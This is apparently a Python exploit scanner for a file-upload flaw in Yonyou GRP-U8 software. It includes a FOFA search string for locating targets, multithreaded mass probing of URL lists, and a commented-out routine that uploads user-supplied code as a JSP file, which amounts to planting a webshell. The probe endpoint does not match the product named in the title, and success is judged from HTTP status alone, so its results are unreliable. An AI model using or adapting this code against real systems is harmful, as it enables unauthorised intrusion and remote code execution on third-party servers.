#用友GRP-U8 FileUpload 文件上传漏洞

# FOFA：app="用友-GRP-U8"

import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
   _____ _____  _____        _    _  ___  
  / ____|  __ \|  __ \      | |  | |/ _ \ 
 | |  __| |__) | |__) |_____| |  | | (_) |
 | | |_ |  _  /|  ___/______| |  | |> _ < 
 | |__| | | \ \| |          | |__| | (_) |
  \_____|_|  \_\_|           \____/ \___/ 
                                          
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友GRP-U8")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
            # exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    header = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    }
    data = 'test666'
    payload = '/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM'
    url = target+payload

    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False,)
        if res.status_code == 200 :
            print(f"f[+]该url存在文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
                # return True
        else:
            print(f"[-]该站点{target}不存在文件上传漏洞")
            # return False
    except Exception :
        print(f"[*]该站点{target}存在访问问题，请手工测试")
        # return False
# def exp(target):
#     print("--------------正在进行漏洞利用------------")
#     time.sleep(2)
#     cmd = input('请输入你要执行的代码：')
#     headers = {
#             'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
#             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
#             'Accept-Encoding': 'gzip, deflate',
#             'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#             'Connection': 'close'
#     }
#     payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'            
#     data = cmd
#     res = requests.post(url=target+payload,headers=headers,data=data)
#     print("漏洞成功利用")
if __name__ == '__main__':
    main()